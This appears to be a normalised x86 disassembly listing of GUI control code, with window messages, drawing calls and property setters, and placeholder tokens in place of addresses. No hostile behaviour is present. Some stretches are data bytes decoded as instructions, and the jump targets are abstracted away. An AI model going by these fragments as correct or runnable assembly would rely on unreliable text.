lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
mov eax esi
mov edx [ rw-data ]
call sub_403300
test al al
jne r-xdata
mov eax esi
call sub_4030bc
mov edx r-xdata
call sub_43d7c8
test al al
jne r-xdata
mov eax esi
call sub_4030bc
mov edx r-xdata
call sub_43d7c8
test al al
jne r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx [ rw-data ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43da04
push 0x0
mov eax esi
call sub_453e1c
push eax
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
lea edx [ ebp - 0x18 ]
movsx eax [ ebx + 0x21c ]
call sub_407f80
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_44d664
sub_43da04
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x40 ]
push 0x0
mov eax ebx
call sub_453e1c
push eax
push 0x469
mov eax ebp
call sub_453e1c
push eax
call SendMessageA
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x40 ]
mov ecx esi
sub ecx eax
mov eax ecx
mov ebp edx
sub ebp edi
lea edx [ eax + esi ]
mov eax ebx
call sub_44cdf0
mov edx edi
sub edx ebp
mov eax ebx
call sub_44cda4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43da58
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44cb04
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
mov eax edi
call sub_454120
test al al
je r-xdata
push 0x0
push 0x0
push 0x469
mov eax edi
call sub_453e1c
push eax
call SendMessageA
xor eax eax
mov [ edi + 0x20c ] eax
sub_43daa8
push ebx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
mov ax [ ebx + 0x21c ]
pop ebx
retn
push 0x0
push 0x0
push 0x468
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov [ ebx + 0x21c ] ax
pop ebx
retn
sub_43dae0
push ebx
mov ebx eax
cmp dx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dx
mov eax ebx
call sub_454120
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406a38
push eax
push 0x0
push 0x465
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43db28
push ebx
mov ebx eax
cmp dx [ ebx + 0x212 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x212 ] dx
mov eax ebx
call sub_454120
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406a38
push eax
push 0x0
push 0x465
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43db70
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43dbcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43dc98
push [ fs : eax ]
mov [ fs : eax ] esp
mov di [ ebx + 0x21c ]
cmp si di
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dc9f
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x21c ] si
test [ ebx + 0x1c ] 0x10
je r-xdata
mov ecx esi
sub cx di
mov edx esi
mov eax ebx
call sub_43d698
test al al
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406a38
push eax
push 0x0
push 0x467
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov esi [ ebx + 0x20c ]
mov eax esi
mov edx [ rw-data ]
call sub_403300
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x21c ]
call sub_407f80
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44d664
sub_43dca8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x229 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x229 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_4513bc
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43dd1c
push ebx
mov ebx eax
cmp dl [ ebx + 0x228 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x228 ] dl
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
call sub_4513bc
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43dd58
push ebx
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
call sub_4513bc
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43dd94
push ebx
mov ebx eax
cmp dl [ ebx + 0x21e ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21e ] dl
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
call sub_4513bc
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43ddd0
push ebx
mov ebx eax
cmp dl [ ebx + 0x21f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21f ] dl
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
call sub_4513bc
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43de10
push cs
push cs
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x61506574
jb r-xdata
pop esp
insd
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
add [ eax ] al
push ebx
push esi
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x238 ] 0x1
mov [ esi + 0x236 ] 0x1
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44fb48
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x64
mov eax esi
call sub_44cdf0
mov edx 0x50
mov eax esi
call sub_44ce14
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
add esp 0xfffffff0
call sub_4034c0
sub_43deb8
push ebx
push esi
add esp 0xfffffee8
mov esi edx
mov ebx eax
mov eax 0x80
call sub_4370a4
mov edx esi
mov eax ebx
call sub_450ca8
call sub_437140
cmp eax 0x40047
jge r-xdata
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450bd4
mov eax [ esi + 0x4 ]
xor edx edx
mov dl [ ebx + 0x210 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x235 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x236 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
and [ esi + 0x24 ] 0xfffffffc
call sub_437140
cmp eax 0x40047
jge r-xdata
mov eax ebx
call sub_43e3cc
mov [ esi + 0x34 ] eax
add esp 0x118
pop esi
pop ebx
retn
push 0x2
lea edx [ esp + 0x1c ]
mov eax [ ebx ]
call sub_4030c4
lea eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x4
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x4 ]
mov edx r-xdata
lea eax [ esi + 0x4c ]
call sub_408bfc
sub_43dfad
add [ eax ] al
add [ ebx - 0x75 ] dl
fadd st6
and [ ecx ] 0x2
add [ eax ] al
add dh al
and [ eax ] 0x2
add [ eax ] al
add [ ebx + 0x2e0ce8c3 ] cl
add [ eax ] eax
mov eax ebx
call sub_43e00c
pop ebx
retn
sub_43dfd4
push ebx
push esi
push ecx
mov esi eax
mov bl [ esi + 0x208 ]
mov al [ esi + 0x220 ]
mov [ esp ] al
xor edx edx
mov eax esi
call sub_43e780
mov eax esi
call sub_4511b8
mov al [ esp ]
mov [ esi + 0x220 ] al
mov [ esi + 0x208 ] bl
pop edx
pop esi
pop ebx
retn
sub_43e00c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43e780
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
mov dl 0x1
mov eax ebx
call sub_43e5a0
sub_43e03c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_454be4
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push 0xffffffff
push 0xffffffff
push eax
call InflateRect
sub_43e078
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454c74
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x13
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetDCEx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e16f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowRect
mov ecx [ ebp - 0x14 ]
neg ecx
mov edx [ ebp - 0x18 ]
neg edx
lea eax [ ebp - 0x18 ]
call sub_405f74
mov eax [ ebp - 0xc ]
dec eax
push eax
mov eax [ ebp - 0x10 ]
dec eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
mov eax [ ebp - 0x18 ]
inc eax
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
push 0x0
push 0x1
push 0x1
call CreatePen
mov ebx eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_423584
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetBkColor
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call Rectangle
test esi esi
je r-xdata
push ebx
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ReleaseDC
retn
push esi
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
sub_43e18c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4522f8
push 0xffffffff
push 0x0
mov eax ebx
call sub_453e1c
push eax
call InvalidateRect
mov eax [ ebx + 0x218 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x21c ]
xor edx edx
xor eax eax
call sub_405f50
cmp [ ebx + 0x210 ] 0x0
je r-xdata
push esp
mov eax ebx
call sub_453e1c
push eax
call ValidateRect
mov eax ebx
call sub_453e1c
push eax
call UpdateWindow
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_453e1c
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_44d07c
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
sub eax edx
sar eax 0x1
jns r-xdata
push eax
mov eax ebx
call sub_44d038
mov edx eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
lea eax [ esp + 0x4 ]
pop ecx
call sub_405f74
adc edx 0x0
sub_43e25c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ ebx + 0x6 ]
dec ax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
pop esi
pop ebx
retn
dec ax
je r-xdata
cmp [ esi + 0x23c ] 0x0
jne r-xdata
jmp r-xdata
dec [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
jmp r-xdata
pop esi
pop ebx
retn
sub_43e34c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20c ]
call sub_403f40
mov al [ ebx + 0x211 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x228 ]
mov [ esi + 0x8 ] eax
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x230 ]
call sub_403f40
mov eax [ ebx + 0x22c ]
mov [ esi + 0x10 ] eax
pop esi
pop ebx
retn
sub_43e38c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x20c ]
mov edx [ esi ]
call sub_403f40
mov al [ esi + 0x4 ]
mov [ ebx + 0x211 ] al
mov eax [ esi + 0x8 ]
mov [ ebx + 0x228 ] eax
lea eax [ ebx + 0x230 ]
mov edx [ esi + 0xc ]
call sub_403f40
mov eax [ esi + 0x10 ]
mov [ ebx + 0x22c ] eax
pop esi
pop ebx
retn
sub_43e3cc
cmp [ eax + 0x211 ] 0x0
je r-xdata
mov edx [ eax + 0x228 ]
test edx edx
je r-xdata
call sub_4370f8
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
jmp r-xdata
retn
sub_43e404
push ebx
mov ebx eax
mov al [ ebx + 0x211 ]
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
pop ebx
retn
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov eax [ ebx + 0x20c ]
jmp r-xdata
mov eax [ ebx + 0x22c ]
mov eax [ ebx + 0x230 ]
jmp r-xdata
pop ebx
retn
sub_43e448
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43e3cc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
push 0x40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41af78
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43e404
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x230 ]
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b354
jmp r-xdata
pop ebx
pop ebp
retn
sub_43e4dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_43e448
pop ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e592
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx 0x30
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x30
jne r-xdata
xor ecx ecx
mov edx 0x40
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x40
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41acf0
xor ecx ecx
mov edx 0x44
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x44
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x21c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41acf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e599
mov eax [ ebp - 0x8 ]
call sub_403174
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x218 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41acf0
sub_43e5a0
test [ eax + 0x1c ] 0x2
je r-xdata
cmp dl [ eax + 0x208 ]
je r-xdata
test dl dl
je r-xdata
retn
test dl dl
je r-xdata
mov [ eax + 0x234 ] 0x1
retn
call sub_43ea18
mov edx [ eax + 0x224 ]
push edx
mov cx [ eax + 0x23a ]
mov dx [ eax + 0x238 ]
call sub_43e968
jmp r-xdata
sub_43e5f4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x211 ]
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x211 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
call sub_437140
cmp eax 0x40047
jl r-xdata
mov [ esi + 0x221 ] al
mov [ esi + 0x211 ] bl
lea eax [ esi + 0x20c ]
call sub_403eec
xor eax eax
mov [ esi + 0x228 ] eax
lea eax [ esi + 0x230 ]
call sub_403eec
xor eax eax
mov [ esi + 0x22c ] eax
test bl bl
jne r-xdata
mov al 0x1
mov eax esi
call sub_43e9c4
xor edx edx
mov eax esi
call sub_43e780
jmp r-xdata
sub_43e668
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_40439c
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404858
xor eax eax
push ebp
push sub_43e772
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov edx [ ebp - 0x8 ]
call sub_407e10
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e779
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_40491c
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_43e34c
xor eax eax
push ebp
push sub_43e734
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
add eax 0x20c
mov edx [ ebp - 0x8 ]
call sub_403f40
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x228 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x230
call sub_403eec
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x22c ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e9c4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43e780
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43e739
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_43e38c
call sub_403950
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e779
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_40491c
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_43e780
push esi
mov esi eax
cmp dl [ esi + 0x220 ]
je r-xdata
pop esi
retn
test dl dl
je r-xdata
mov eax esi
call sub_43e920
mov [ esi + 0x220 ] al
mov eax esi
call sub_43e880
mov [ esi + 0x220 ] al
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax esi
mov si 0xffee
call sub_403370
jmp r-xdata
sub_43e7dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x238 ] si
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_43ea18
mov edx esi
mov eax ebx
call sub_43e9e4
sub_43e850
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_43e780
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_43e880
push esi
add esp 0xffffffec
mov esi eax
cmp [ esi + 0x221 ] 0x0
je r-xdata
mov eax esi
call sub_453df8
cmp [ esi + 0x210 ] 0x0
jne r-xdata
mov eax esi
call sub_4513bc
mov eax esi
call sub_43e404
push eax
mov eax esi
call sub_43e3cc
mov ecx eax
mov edx 0x464
mov eax esi
call sub_44e7e8
test eax eax
setne [ esp ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_44cfd4
cmp [ esp ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_44cff4
mov al [ esp ]
add esp 0x14
pop esi
retn
mov eax esi
call sub_43e4dc
mov [ esi + 0x238 ] 0x1
mov ax [ esi + 0x214 ]
mov [ esi + 0x23a ] ax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43e920
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x464
mov eax esi
call sub_453e1c
push eax
call SendMessageA
test eax eax
setne bl
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_43ea18
sub_43e968
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
call sub_453df8
mov eax ebx
call sub_43e850
mov [ ebx + 0x208 ] 0x1
test esi esi
jne r-xdata
mov dx [ ebp - 0x2 ]
dec edx
mov eax edi
dec eax
call sub_406a38
push eax
mov ecx esi
mov edx 0x465
mov eax ebx
call sub_44e7e8
dec eax
je r-xdata
or esi 0xffffffff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ ebx + 0x208 ] 0x0
sub_43e9e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43e850
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406a38
push eax
push 0x1
push 0x465
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_43ea18
push ebx
push esi
mov esi eax
mov bx [ esi + 0x238 ]
dec ebx
mov edx ebx
mov eax ebx
call sub_406a38
push eax
push 0x1
push 0x465
mov eax esi
call sub_453e1c
push eax
call SendMessageA
mov [ esi + 0x208 ] 0x0
inc [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
sub_43ea5c
push ebx
push esi
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor ebx ebx
mov bl 0x1
mov esi [ eax + 0x21c ]
mov [ edx ] esi
mov eax [ eax + 0x218 ]
mov [ ecx ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43ea84
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xff000005
mov [ eax + 0xc ] 0xff000008
mov [ eax + 0x10 ] 0xff000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0xff000013
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_43ead4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43ebc5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030c4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404150
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030c4
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ebcc
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_43ebe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_454120
test al al
je r-xdata
jmp [ eax * 4 + jump_table_43ebf7 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_423584
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd8 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_43ec58
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_43ebe0
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_43ebe0
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_43ebe0
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_43ebe0
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_43ebe0
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_43ebe0
pop ebx
retn
sub_43ecb4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_4370d0
mov ecx esi
xor edx edx
mov eax edi
call sub_44fb48
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43ea84
mov [ edi + 0x208 ] eax
call sub_409960
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_43ed50
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fc6c
mov eax [ esi + 0x208 ]
call sub_403174
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_43ed84
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43ee85
